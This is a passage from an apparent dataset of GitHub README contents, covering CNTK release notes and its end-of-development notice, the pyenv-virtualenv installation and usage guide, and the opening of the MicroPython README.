models](.\/PretrainedModels)\n* [Blog](https:\/\/www.microsoft.com\/en-us\/cognitive-toolkit\/blog\/)\n* [Presentations](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/Presentations)\n* [License](.\/LICENSE.md)\n\n## More information\n\n* [Contribute to CNTK](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/Contributing-to-CNTK)\n* [FAQ](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/CNTK-FAQ)\n* [Feedback](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/Feedback-Channels)\n\n## Disclaimer\n\nDear community, \n\nWith our ongoing contributions to ONNX and the ONNX Runtime, we have made it easier to interoperate within the AI framework ecosystem and to access high performance, cross-platform inferencing capabilities for both traditional ML models and deep neural networks. Over the last few years we have been privileged to develop such key open-source machine learning projects, including the Microsoft Cognitive Toolkit, which has enabled its users to leverage industry-wide advancements in deep learning at scale. \n\nToday\u2019s 2.7 release will be the last main release of CNTK. We may have some subsequent minor releases for bug fixes, but these will be evaluated on a case-by-case basis. There are no plans for new feature development post this release. \n\nThe CNTK 2.7 release has full support for ONNX 1.4.1, and we encourage those seeking to operationalize their CNTK models to take advantage of ONNX and the ONNX Runtime. Moving forward, users can continue to leverage evolving ONNX innovations via the number of frameworks that support it. For example, users can natively export ONNX models from PyTorch or convert TensorFlow models to ONNX with the TensorFlow-ONNX converter. \n\nWe are incredibly grateful for all the support we have received from contributors and users over the years since the initial open-source release of CNTK. CNTK has enabled both Microsoft teams and external users to execute complex and large-scale workloads in all manner of deep learning applications, such as historical breakthroughs in speech recognition achieved by Microsoft Speech researchers, the originators of the framework. \n\nAs ONNX is increasingly employed in serving models used across Microsoft products such as Bing and Office, we are dedicated to synthesizing innovations from research with the rigorous demands of production to progress the ecosystem forward. \n\nAbove all, our goal is to make innovations in deep learning across the software and hardware stacks as open and accessible as possible. We will be working hard to bring both the existing strengths of CNTK and new state-of-the-art research into other open-source projects to truly broaden the reach of such technologies. \n\nWith gratitude, \n\n-- The CNTK Team \n\n## Microsoft Open Source Code of Conduct\n\nThis project has adopted the [Microsoft Open Source Code of Conduct](https:\/\/opensource.microsoft.com\/codeofconduct\/). For more information see the [Code of Conduct FAQ](https:\/\/opensource.microsoft.com\/codeofconduct\/faq\/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\n\n## News\n\n> You can find more news on [the official project feed](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/news)\n\n***2019-03-29.*** CNTK 2.7.0\n## Highlights of this release\n* Moved to CUDA 10 for both Windows and Linux.\n* Support advance RNN loop in ONNX export.\n* Export larger than 2GB models in ONNX format.\n* Support FP16 in Brain Script train action.\n\n## CNTK support for CUDA 10\n\n### CNTK now supports CUDA 10. This requires an update to build environment to Visual Studio 2017 v15.9 for Windows.\n\nTo setup build and runtime environment on Windows:\n* Install [Visual Studio 2017](https:\/\/www.visualstudio.com\/downloads\/). Note: going forward for CUDA 10 and beyond, it is no longer required to install and run with the specific VC Tools version 14.11.\n* Install [Nvidia CUDA 10](https:\/\/developer.nvidia.com\/cuda-downloads?target_os=Windows&target_arch=x86_64)\n* From PowerShell, run:\n    [DevInstall.ps1](..\/Tools\/devInstall\/Windows\/DevInstall.ps1)\n* Start Visual Studio 2017 and open [CNTK.sln](.\/CNTK.sln).\n\nTo setup build and runtime environment on Linux using docker, please build Unbuntu 16.04 docker image using Dockerfiles [here](.\/Tools\/docker). For other Linux systems, please refer to the Dockerfiles to setup dependent libraries for CNTK.\n\n## Support advance RNN loop in ONNX export\nCNTK models with recursive loops can be exported to ONNX models with scan ops.\n\n## Export larger than 2GB models in ONNX format\nTo export models larger than 2GB in ONNX format, use cntk.Function API:\nsave(self, filename, format=ModelFormat.CNTKv2, use_external_files_to_store_parameters=False)\nwith 'format' set to ModelFormat.ONNX and use_external_files_to_store_parameters set to True.\nIn this case, model parameters are saved in external files. Exported models shall be used with external parameter files when doing model evaluation with onnxruntime.\n\n***2018-11-26.***  \n[Netron](https:\/\/github.com\/lutzroeder\/netron) now supports visualizing CNTK v1 and CNTK v2 `.model` files.\n\n<img src=https:\/\/cntk.ai\/Images\/netron\/netron-cntk-dark-1.png alt=\"NetronCNTKDark1\" width=\"300\"> <img src=https:\/\/cntk.ai\/Images\/netron\/netron-cntk-light-1.png alt=\"NetronCNTKLight1\" width=\"300\">\n\n\n### Project changelog\n\n***2018-09-17.*** CNTK 2.6.0\n## Efficient group convolution\nThe implementation of group convolution in CNTK has been updated. The updated implementation moves away from creating a sub-graph for group convolution (using slicing and splicing), and instead uses cuDNN7 and MKL2017 APIs directly. This improves the experience both in terms of performance and model size. \n\nAs an example, for a single group convolution op with the following attributes:\n\n- Input tensor (C, H, W) = (32, 128, 128)\n- Number of output channels = 32 (channel multiplier is 1)\n- Groups = 32 (depth wise convolution)\n- Kernel size = (5, 5)\n\nThe comparison numbers for this single node are as follows:\n\n| First Header  | GPU exec. time (in millisec., 1000 run avg.) | CPU exec. time (in millisec., 1000 run avg.) | Model Size (in KB, CNTK format)\n| ------------- | ------------- | ------------- | ------------- |\n| Old implementation  | 9.349  | 41.921  | 38  |\n| New implementation  | 6.581  | 9.963  | 5  |\n| Speedup\/savings   Approx.  | 30%  Approx.  | 65-75%   Approx.  | 87% |\n\n## Sequential Convolution\nThe implementation of sequential convolution in CNTK has been updated. The updated implementation creates a separate sequential convolution layer. Different from regular convolution layer, this operation convolves also on the dynamic axis(sequence), and filter_shape[0] is applied to that axis. The updated implementation supports broader cases, such as where stride > 1 for the sequence axis.\n\nFor example, a sequential convolution over a batch of one-channel black-and-white images. The images have the same fixed height of 640, but each with width of variable lengths. The width is then represented by sequential axis. Padding is enabled, and strides for both width and height are 2.\n\n     >>> f = SequentialConvolution((3,3), reduction_rank=0, pad=True, strides=(2,2), activation=C.relu)\n     >>> x = C.input_variable(**Sequence[Tensor[640]])\n     >>> x.shape\n         (640,)\n     >>> h = f(x)\n     >>> h.shape\n         (320,)\n     >>> f.W.shape\n         (1, 1, 3, 3)\n\n## Operators\n### depth_to_space and space_to_depth\nThere is a breaking change in the **depth_to_space** and **space_to_depth** operators. These have been updated to match ONNX specification, specifically\nthe permutation for how the depth dimension is placed as blocks in the spatial dimensions, and vice-versa, has been changed. Please refer to the updated doc\nexamples for these two ops to see the change.\n\n### Tan and Atan\nAdded support for trigonometric ops `Tan` and `Atan`.\n\n### ELU\nAdded support for `alpha` attribute in ELU op.\n\n### Convolution\nUpdated auto padding algorithms of `Convolution` to produce symmetric padding at best effort on CPU, without affecting the final convolution output values. This update increases the range of cases that could be covered by MKL API and improves the performance, E.g. ResNet50.\n\n## Default arguments order\nThere is a breaking change in the **arguments** property in CNTK python API. The default behavior has been updated to return arguments in python order instead of in C++ order. This way it will return arguments in the same order as they are fed into ops. If you wish to still get arguments in C++ order, you can simply override the global option. This change should only affect the following ops: Times, TransposeTimes, and Gemm(internal). \n\n## Bug fixes\n- Updated doc for Convolution layer to include group and dilation arguments.\n- Added improved input validation for group convolution.\n- Updated `LogSoftMax` to use more numerically stable implementation.\n- Fixed Gather op's incorrect gradient value.\n- Added validation for 'None' node in python clone substitution.\n- Added validation for padding channel axis in convolution.\n- Added CNTK native default lotusIR logger to fix the \"Attempt to use DefaultLogger\" error when loading some ONNX models.\n- Added proper initialization for ONNX TypeStrToProtoMap.\n- Updated python doctest to handle different print format for newer version numpy(version >= 1.14).\n- Fixed Pooling(CPU) to produce correct output values when kernel center is on padded input cells.\n\n## ONNX\n### Updates\n- Updated CNTK's ONNX import\/export to use ONNX 1.2 spec.\n- Major update to how batch and sequence axes are handled in export and import. As a result, the complex scenarios and edge cases are handled accurately.\n- Updated CNTK's ONNX `BatchNormalization` op export\/import to latest spec.\n- Added model domain to ONNX model export.\n- Improved error reporting during import and export of ONNX models.\n- Updated `DepthToSpace` and `SpaceToDepth` ops to match ONNX spec on the permutation for how the depth dimension is placed as block dimension.\n- Added support for exporting `alpha` attribute in `ELU` ONNX op.\n- Major overhaul to `Convolution` and `Pooling` export. Unlike before, these ops do not export an explicit `Pad` op in any situation.\n- Major overhaul to `ConvolutionTranspose` export and import. Attributes such as `output_shape`, `output_padding`, and `pads` are fully supported.\n- Added support for CNTK's `StopGradient` as a no-op.\n- Added ONNX support for TopK op.\n- Added ONNX support for sequence ops: sequence.slice, sequence.first, sequence.last, sequence.reduce_sum, sequence.reduce_max, sequence.softmax. For these ops, there is no need to expand ONNX spec. CNTK ONNX exporter just builds computation equivalent graphs for these sequence ops.\n- Added full support for Softmax op.\n- Made CNTK broadcast ops compatible with ONNX specification.\n- Handle to_batch, to_sequence, unpack_batch, sequence.unpack ops in CNTK ONNX exporter.\n- ONNX tests to export ONNX test cases for other toolkits to run and to validate.\n- Fixed `Hardmax`\/`Softmax`\/`LogSoftmax` import\/export.\n- Added support for `Select` op export.\n- Added import\/export support for several trigonometric ops.\n- Updated CNTK support for ONNX `MatMul` op.\n- Updated CNTK support for ONNX `Gemm` op.\n- Updated CNTK's ONNX `MeanVarianceNormalization` op export\/import to latest spec.\n- Updated CNTK's ONNX `LayerNormalization` op export\/import to latest spec.\n- Updated CNTK's ONNX `PRelu` op export\/import to latest spec.\n- Updated CNTK's ONNX `Gather` op export\/import to latest spec.\n- Updated CNTK's ONNX `ImageScaler` op export\/import to latest spec.\n- Updated CNTK's ONNX `Reduce` ops export\/import to latest spec.\n- Updated CNTK's ONNX `Flatten` op export\/import to latest spec.\n- Added CNTK support for ONNX `Unsqueeze` op.\n\n### Bug or minor fixes:\n- Updated LRN op to match ONNX 1.2 spec where the `size` attribute has the semantics of diameter, not radius. Added validation if LRN kernel size is larger than channel size.\n- Updated `Min`\/`Max` import implementation to handle variadic inputs.\n- Fixed possible file corruption when resaving on top of existing ONNX model file.\n\n## .Net Support\nThe Cntk.Core.Managed library has officially been converted to .Net Standard and supports .Net Core and .Net Framework applications on both Windows and Linux. Starting from this release, .Net developers should be able to restore CNTK Nuget packages using new .Net SDK style project file with package management format set to PackageReference.\n\nThe following C# code now works on both Windows and Linux:\n\n     >>> var weightParameterName = \"weight\";\n\t >>> var biasParameterName = \"bias\";\n\t >>> var inputName = \"input\";\n\t >>> var outputDim = 2;\n\t >>> var inputDim = 3;\n\t >>> Variable inputVariable = Variable.InputVariable(new int[] { inputDim }, DataType.Float, inputName);\n\t >>> var weightParameter = new Parameter(new int[] { outputDim, inputDim }, DataType.Float, 1, device, weightParameterName);\n\t >>> var biasParameter = new Parameter(new int[] { outputDim }, DataType.Float, 0, device, biasParameterName);\n\t >>> \n     >>> Function modelFunc = CNTKLib.Times(weightParameter, inputVariable) + biasParameter;\n\nFor example, simply adding an ItemGroup clause in the .csproj file of a .Net Core application is sufficient:\n     >>> <Project Sdk=\"Microsoft.NET.Sdk\">\n     >>>\n     >>>   <PropertyGroup>\n     >>>     <TargetFramework>netcoreapp2.1<\/TargetFramework>\n     >>>     <Platforms>x64<\/Platforms>\n     >>>   <\/PropertyGroup>\n     >>>\n     >>>   <ItemGroup>\n     >>>     <PackageReference Include=\"CNTK.GPU\" Version=\"2.6.0\" \/>\n     >>>   <\/ItemGroup>\n     >>>\n     >>> <\/Project>\n\n### Bug or minor fixes:\n- Fixed C# string and char to native wstring and wchar UTF conversion issues on Linux.\n- Fixed multibyte and wide character conversions across the codebase.\n- Fixed Nuget package mechanism to pack for .Net Standard.\n- Fixed a memory leak issue in Value class in C# API where Dispose was not called upon object destruction.\n\n## Misc\n\n\n***2018-04-16.*** CNTK 2.5.1\n\nRepack CNTK 2.5 with third party libraries included in the bundles (Python wheel packages)\n\n---\n\n***2018-03-15.*** CNTK 2.5\n\nChange profiler details output format to be `chrome:\/\/tracing`\n\nEnable per-node timing. Working example [here](\/Examples\/Image\/Classification\/MLP\/Python\/SimpleMNIST.py)\n* per-node timing creates items in profiler details when profiler is enabled.\n* usage in Python:\n\n```python\nimport cntk as C\nC.debugging.debug.set_node_timing(True)\nC.debugging.start_profiler() # optional\nC.debugging.enable_profiler() # optional\n#<trainer|evaluator|function> executions\n<trainer|evaluator|function>.print_node_timing()\nC.debugging.stop_profiler()\n```\n\nExample profiler details view in `chrome:\/\/tracing`\n![ProfilerDetailWithNodeTiming](https:\/\/cntk.ai\/Images\/ProfilerDetailWithNodeTiming.jpg)\n\nCPU inference performance improvements using MKL\n* Accelerates some common tensor ops in Intel CPU inference for float32, especially for fully connected networks\n* Can be turned on\/off by `cntk.cntk_py.enable_cpueval_optimization()\/cntk.cntk_py.disable_cpueval_optimization()`\n\n1BitSGD incorporated into CNTK\n* `1BitSGD` source code is now available with CNTK license (MIT license) under `Source\/1BitSGD\/`\n* `1bitsgd` build target was merged into existing gpu target\n\nNew loss function: hierarchical softmax\n* Thanks @yaochengji for the contribution!\n\nDistributed Training with Multiple Learners\n* Trainer now accepts multiple parameter learners for distributed training. With this change, different parameters of a network can be learned by different learners in a single training session. This also facilitates distributed training for GANs. For more information, please refer to the [Basic_GAN_Distributed.py](\/Examples\/Image\/GAN\/Basic_GAN_Distributed.py) and the [cntk.learners.distributed_multi_learner_test.py](\/bindings\/python\/cntk\/learners\/tests\/distributed_multi_learner_test.py)\n\nOperators\n* Added `MeanVarianceNormalization` operator. \n\nBug fixes\n* Fixed convergence issue in Tutorial 201B\n* Fixed pooling\/unpooling to support free dimension for sequences\n* Fixed crash in `CNTKBinaryFormat` deserializer when crossing sweep boundary\n* Fixed shape inference bug in RNN step function for scalar broadcasting\n* Fixed a build bug when `mpi=no`\n* Improved distributed training aggregation speed by increasing packing threshold, and expose the knob in V2\n* Fixed a memory leak in MKL layout\n* Fixed a bug in `cntk.convert` API in `misc.converter.py`, which prevents converting complex networks.\n\nONNX\n* Updates\n    * CNTK exported ONNX models are now `ONNX.checker` compliant. \n    * Added ONNX support for CNTK\u2019s `OptimizedRNNStack` operator (LSTM only).\n    * Added support for LSTM and GRU operators\n    * Added support for experimental ONNX op `MeanVarianceNormalization`.\n    * Added support for experimental ONNX op `Identity`.\n    * Added support for exporting CNTK\u2019s `LayerNormalization` layer using ONNX `MeanVarianceNormalization` op.\n* Bug or minor fixes:\n    * Axis attribute is optional in CNTK\u2019s ONNX `Concat` operator.\n    * Bug fix in ONNX broadcasting for scalars.\n    * Bug fix in ONNX ConvTranspose operator. \n    * Backward compatibility bug fix in `LeakyReLu` (argument \u2018alpha\u2019 reverted to type double).\n\nMisc\n* Added a new API `find_by_uid()` under `cntk.logging.graph`. \n\n---\n\n***2018-02-28.*** CNTK supports nightly build\n\nIf you prefer to use latest CNTK bits from master, use one of the CNTK nightly package.\n* [Nightly packages for Windows](https:\/\/cntk.ai\/nightly-windows.html)\n* [Nightly packages for Linux](https:\/\/cntk.ai\/nightly-linux.html)\n\nAlternatively, you can also click corresponding build badge to land to nightly build page.\n\n---\n\n***2018-01-31.* CNTK 2.4**\n\nHighlights:\n* Moved to CUDA9, cuDNN 7 and Visual Studio 2017.\n* Removed Python 3.4 support.\n* Added Volta GPU and FP16 support.\n* Better ONNX support.\n* CPU perf improvement.\n* More OPs.\n\nOPs\n* `top_k` operation: in the forward pass it computes the top (largest) k values and corresponding indices along the specified axis. In the backward pass the gradient is scattered to the top k elements (an element not in the top k gets a zero gradient).\n* `gather` operation now supports an axis argument\n* `squeeze` and `expand_dims` operations for easily removing and adding singleton axes\n* `zeros_like` and `ones_like` operations. In many situations you can just rely on CNTK correctly broadcasting a simple 0 or 1 but sometimes you need the actual tensor.\n* `depth_to_space`: Rearranges elements in the input tensor from the depth dimension into spatial blocks. Typical use of this operation is for implementing sub-pixel convolution for some image super-resolution models.\n* `space_to_depth`: Rearranges elements in the input tensor from the spatial dimensions to the depth dimension. It is largely the inverse of DepthToSpace.\n* `sum` operation: Create a new Function instance that computes element-wise sum of input tensors.\n* `softsign` operation: Create a new Function instance that computes the element-wise softsign of a input tensor.\n* `asinh` operation: Create a new Function instance that computes the element-wise asinh of a input tensor.\n* `log_softmax` operation: Create a new Function instance that computes the logsoftmax normalized values of a input tensor.\n* `hard_sigmoid` operation: Create a new Function instance that computes the hard_sigmoid normalized values of a input tensor.\n* `element_and`, `element_not`, `element_or`, `element_xor` element-wise logic operations\n* `reduce_l1` operation: Computes the L1 norm of the input tensor's element along the provided axes.\n* `reduce_l2` operation: Computes the L2 norm of the input tensor's element along the provided axes.\n* `reduce_sum_square` operation: Computes the sum square of the input tensor's element along the provided axes.\n* `image_scaler` operation: Alteration of image by scaling its individual values.\n\nONNX\n* There have been several improvements to ONNX support in CNTK.\n* Updates\n  * Updated ONNX `Reshape` op to handle `InferredDimension`.\n  * Adding `producer_name` and `producer_version` fields to ONNX models.\n  * Handling the case when neither `auto_pad` nor `pads` atrribute is specified in ONNX `Conv` op.\n* Bug fixes\n  * Fixed bug in ONNX `Pooling` op serialization\n  * Bug fix to create ONNX `InputVariable` with only one batch axis.\n  * Bug fixes and updates to implementation of ONNX `Transpose` op to match updated spec.\n  * Bug fixes and updates to implementation of ONNX `Conv`, `ConvTranspose`, and `Pooling` ops to match updated spec.\n\nOperators\n* Group convolution\n  * Fixed bug in group convolution. Output of CNTK `Convolution` op will change for groups > 1. More optimized implementation of group convolution is expected in the next release.\n  * Better error reporting for group convolution in `Convolution` layer.\n\nHalide Binary Convolution\n- The CNTK build can now use optional [Halide](http:\/\/halide-lang.org\/) libraries to build `Cntk.BinaryConvolution.so\/dll` library that can be used with the `netopt` module. The library contains optimized binary convolution operators that perform better than the python based binarized convolution operators. To enable Halide in the build, please download [Halide release](https:\/\/github.com\/halide\/Halide\/releases) and set `HALIDE_PATH` environment varibale before starting a build. In Linux, you can use `.\/configure --with-halide[=directory]` to enable it. For more information on how to use this feature, please refer to [How_to_use_network_optimization](https:\/\/github.com\/Microsoft\/CNTK\/blob\/master\/Manual\/Manual_How_to_use_network_optimizations.ipynb).\n\nSee more in the [Release Notes](https:\/\/docs.microsoft.com\/en-us\/cognitive-toolkit\/ReleaseNotes\/CNTK_2_4_Release_Notes).\nGet the Release from the [CNTK Releases page](https:\/\/github.com\/Microsoft\/CNTK\/releases).\n"},{"repo":"\/pyenv\/pyenv-virtualenv","language":"Shell","readme_contents":"# pyenv-virtualenv\n\n[![Join the chat at https:\/\/gitter.im\/yyuu\/pyenv-virtualenv](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/yyuu\/pyenv-virtualenv?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n[![Build Status](https:\/\/travis-ci.org\/pyenv\/pyenv-virtualenv.svg?branch=master)](https:\/\/travis-ci.org\/pyenv\/pyenv-virtualenv)\n\npyenv-virtualenv is a [pyenv](https:\/\/github.com\/pyenv\/pyenv) plugin\nthat provides features to manage virtualenvs and conda environments\nfor Python on UNIX-like systems.\n\n(NOTICE: If you are an existing user of [virtualenvwrapper](http:\/\/pypi.python.org\/pypi\/virtualenvwrapper)\nand you love it, [pyenv-virtualenvwrapper](https:\/\/github.com\/pyenv\/pyenv-virtualenvwrapper) may help you\n(additionally) to manage your virtualenvs.)\n\n## Installation\n\n### Installing as a pyenv plugin\n\nThis will install the latest development version of pyenv-virtualenv into\nthe `$(pyenv root)\/plugins\/pyenv-virtualenv` directory.\n\n**Important note:**  If you installed pyenv into a non-standard directory, make\nsure that you clone this repo into the 'plugins' directory of wherever you\ninstalled into.\n\nFrom inside that directory you can:\n - Check out a specific release tag.\n - Get the latest development release by running `git pull` to download the\n   latest changes.\n\n1. **Check out pyenv-virtualenv into plugin directory**\n\n    ```sh\n    $ git clone https:\/\/github.com\/pyenv\/pyenv-virtualenv.git $(pyenv root)\/plugins\/pyenv-virtualenv\n    ```\n\n2. (OPTIONAL) **Add `pyenv virtualenv-init` to your shell** to enable auto-activation of virtualenvs. This is entirely optional but pretty useful. See \"Activate virtualenv\" below.\n\n    ```sh\n    $ echo 'eval \"$(pyenv virtualenv-init -)\"' >> ~\/.bash_profile\n    ```\n\n    **Fish shell note**:  Add this to your `~\/.config\/fish\/config.fish`\n\n    ```sh\n    status --is-interactive; and pyenv init - | source\n    status --is-interactive; and pyenv virtualenv-init - | source\n    ```\n\n    **Zsh note**: Modify your `~\/.zshenv` file instead of `~\/.bash_profile`.\n    \n    **Pyenv note**: You may also need to add `eval \"$(pyenv init -)\"` to your profile if you haven't done so already.\n\n3. **Restart your shell to enable pyenv-virtualenv**\n\n    ```sh\n    $ exec \"$SHELL\"\n    ```\n\n\n### Installing with Homebrew (for macOS users)\n\nmacOS users can install pyenv-virtualenv with the\n[Homebrew](https:\/\/brew.sh) package manager.\nThis will give you access to the `pyenv-virtualenv` command. If you have pyenv\ninstalled, you will also be able to use the `pyenv virtualenv` command.\n\n*This is the recommended method of installation if you installed pyenv\n with Homebrew.*\n\n```sh\n$ brew install pyenv-virtualenv\n```\n\nOr, if you would like to install the latest development release:\n\n```sh\n$ brew install --HEAD pyenv-virtualenv\n```\n\nAfter installation, you'll still need to add \n```sh\neval \"$(pyenv init -)\"\neval \"$(pyenv virtualenv-init -)\"\n```\nto your profile (as stated in the caveats). You'll only ever have to do this once.\n\n\n## Usage\n\n### Using `pyenv virtualenv` with pyenv\n\nTo create a virtualenv for the Python version used with pyenv, run\n`pyenv virtualenv`, specifying the Python version you want and the name\nof the virtualenv directory. For example,\n\n```sh\n$ pyenv virtualenv 2.7.10 my-virtual-env-2.7.10\n```\n\nwill create a virtualenv based on Python 2.7.10 under `$(pyenv root)\/versions` in a\nfolder called `my-virtual-env-2.7.10`.\n\n\n### Create virtualenv from current version\n\nIf there is only one argument given to `pyenv virtualenv`, the virtualenv will\nbe created with the given name based on the current pyenv Python version.\n\n```sh\n$ pyenv version\n3.4.3 (set by \/home\/yyuu\/.pyenv\/version)\n$ pyenv virtualenv venv34\n```\n\n\n### List existing virtualenvs\n\n`pyenv virtualenvs` shows you the list of existing virtualenvs and `conda` environments.\n\n```sh\n$ pyenv shell venv34\n$ pyenv virtualenvs\n  miniconda3-3.9.1 (created from \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1)\n  miniconda3-3.9.1\/envs\/myenv (created from \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1)\n  2.7.10\/envs\/my-virtual-env-2.7.10 (created from \/home\/yyuu\/.pyenv\/versions\/2.7.10)\n  3.4.3\/envs\/venv34 (created from \/home\/yyuu\/.pyenv\/versions\/3.4.3)\n  my-virtual-env-2.7.10 (created from \/home\/yyuu\/.pyenv\/versions\/2.7.10)\n* venv34 (created from \/home\/yyuu\/.pyenv\/versions\/3.4.3)\n```\n\nThere are two entries for each virtualenv, and the shorter one is just a symlink.\n\n\n### Activate virtualenv\n\nSome external tools (e.g. [jedi](https:\/\/github.com\/davidhalter\/jedi)) might\nrequire you to `activate` the virtualenv and `conda` environments.\n\nIf `eval \"$(pyenv virtualenv-init -)\"` is configured in your shell, `pyenv-virtualenv` will automatically activate\/deactivate virtualenvs on entering\/leaving directories which contain a `.python-version` file that contains the name of a valid virtual environment as shown in the output of `pyenv virtualenvs` (e.g., `venv34` or `3.4.3\/envs\/venv34` in example above) . `.python-version` files are used by pyenv to denote local Python versions and can be created and deleted with the [`pyenv local`](https:\/\/github.com\/pyenv\/pyenv\/blob\/master\/COMMANDS.md#pyenv-local) command.\n\nYou can also activate and deactivate a pyenv virtualenv manually:\n\n```sh\npyenv activate <name>\npyenv deactivate\n```\n\n\n### Delete existing virtualenv\n\nRemoving the directories in `$(pyenv root)\/versions` and `$(pyenv root)\/versions\/{version}\/envs` will delete the virtualenv, or you can run:\n\n```sh\npyenv uninstall my-virtual-env\n```\n\nYou can also delete existing virtualenvs by using `virtualenv-delete` command, e.g. you can run:\n```sh\npyenv virtualenv-delete my-virtual-env\n```\nThis will delete virtualenv called `my-virtual-env`.\n\n\n### virtualenv and venv\n\nThere is a [venv](http:\/\/docs.python.org\/3\/library\/venv.html) module available\nfor CPython 3.3 and newer.\nIt provides an executable module `venv` which is the successor of `virtualenv`\nand distributed by default.\n\n`pyenv-virtualenv` uses `python -m venv` if it is available and the `virtualenv`\ncommand is not available.\n\n\n### Anaconda and Miniconda\n\nYou can manage `conda` environments by `conda create` as same manner as standard Anaconda\/Miniconda installations.\nTo use those environments, you can use `pyenv activate` and `pyenv deactivate`.\n\n```sh\n$ pyenv version\nminiconda3-3.9.1 (set by \/home\/yyuu\/.pyenv\/version)\n$ conda env list\n# conda environments:\n#\nmyenv                    \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv\nroot                  *  \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\n$ pyenv activate miniconda3-3.9.1\/envs\/myenv\ndiscarding \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/bin from PATH\nprepending \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv\/bin to PATH\n$ python --version\nPython 3.4.3 :: Continuum Analytics, Inc.\n$ pyenv deactivate\ndiscarding \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv\/bin from PATH\n```\n\nIf `conda` is available, `pyenv virtualenv` will use it to create environment by `conda create`.\n\n```sh\n$ pyenv version\nminiconda3-3.9.1 (set by \/home\/yyuu\/.pyenv\/version)\n$ pyenv virtualenv myenv2\n$ conda env list\n# conda environments:\n#\nmyenv                    \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv\nmyenv                    \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv2\nroot                  *  \/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\n```\n\nYou can use version like `miniconda3-3.9.1\/envs\/myenv` to specify `conda` environment as a version in pyenv.\n\n```sh\n$ pyenv version\nminiconda3-3.9.1 (set by \/home\/yyuu\/.pyenv\/version)\n$ pyenv shell miniconda3-3.9.1\/envs\/myenv\n$ which python\n\/home\/yyuu\/.pyenv\/versions\/miniconda3-3.9.1\/envs\/myenv\/bin\/python\n```\n\n\n### Special environment variables\n\nYou can set certain environment variables to control pyenv-virtualenv.\n\n* `PYENV_VIRTUALENV_CACHE_PATH`, if set, specifies a directory to use for\n  caching downloaded package files.\n* `VIRTUALENV_VERSION`, if set, forces pyenv-virtualenv to install the desired\n  version of virtualenv. If `virtualenv` has not been installed,\n  pyenv-virtualenv will try to install the given version of virtualenv.\n* `GET_PIP`, if set and `venv` is preferred over `virtualenv`,\n  use `get_pip.py` from the specified location.\n* `GET_PIP_URL`, if set and `venv` is preferred over\n  `virtualenv`, download `get_pip.py` from the specified URL.\n* `PIP_VERSION`, if set and `venv` is preferred\n  over `virtualenv`, install the specified version of pip.\n* `PYENV_VIRTUALENV_VERBOSE_ACTIVATE`, if set, shows some verbose outputs on activation and deactivation\n\n## Version History\n\nSee [CHANGELOG.md](CHANGELOG.md).\n\n\n### License\n\n[(The MIT License)](LICENSE)\n\n* Copyright (c) 2015 Yamashita, Yuu\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n\"Software\"), to deal in the Software without restriction, including\nwithout limitation the rights to use, copy, modify, merge, publish,\ndistribute, sublicense, and\/or sell copies of the Software, and to\npermit persons to whom the Software is furnished to do so, subject to\nthe following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\nLIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\nOF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\nWITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n"},{"repo":"\/micropython\/micropython","language":"C","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/micropython\/micropython.png?branch=master)](https:\/\/travis-ci.org\/micropython\/micropython) [![Coverage Status](https:\/\/coveralls.io\/repos\/micropython\/micropython\/badge.png?branch=master)](https:\/\/coveralls.io\/r\/micropython\/micropython?branch=master)\n\nThe MicroPython project\n=======================\n<p align=\"center\">\n  <img src=\"https:\/\/raw.githubusercontent.com\/micropython\/micropython\/master\/logo\/upython-with-micro.jpg\" alt=\"MicroPython Logo\"\/>\n<\/p>\n\nThis is the MicroPython project, which aims to put an implementation\nof Python 3.x on microcontrollers and small embedded systems.\nYou can find the official website at [micropython.org](http:\/\/www.micropython.org).\n\nWARNING: this project is in beta stage and is subject to changes of the\ncode-base, including project-wide name changes and API changes.\n\nMicroPython implements the entire Python 3.4 syntax (including exceptions,\n`with`, `yield from`, etc., and additionally `async`\/`await` keywords from\nPython 3.5). The following core datatypes are provided: `str` (including\nbasic Unicode support), `bytes`, `bytearray`, `tuple`, `list`, `dict`, `set`,\n`frozenset`, `array.array`, `collections.namedtuple`, classes and instances.\nBuiltin modules include `sys`, `time`, and `struct`, etc. Select ports have\nsupport for `_thread` module (multithreading). Note that only a subset of\nPython 3 functionality is implemented for the data types and modules.\n\nMicroPython can execute scripts in textual source form or from precompiled\nbytecode, in both cases either from an on-device filesystem or \"frozen\" into\nthe MicroPython executable.\n\nSee the repository http:\/\/github.com\/micropython\/pyboard for the MicroPython\nboard (PyBoard), the officially supported reference electronic circuit board.\n\nMajor components in this repository:\n- py\/ -- the core Python implementation, including compiler, runtime, and\n  core library.\n- mpy-cross\/ -- the MicroPython cross-compiler which is used to turn scripts\n  into precompiled bytecode.\n- ports\/unix\/ -- 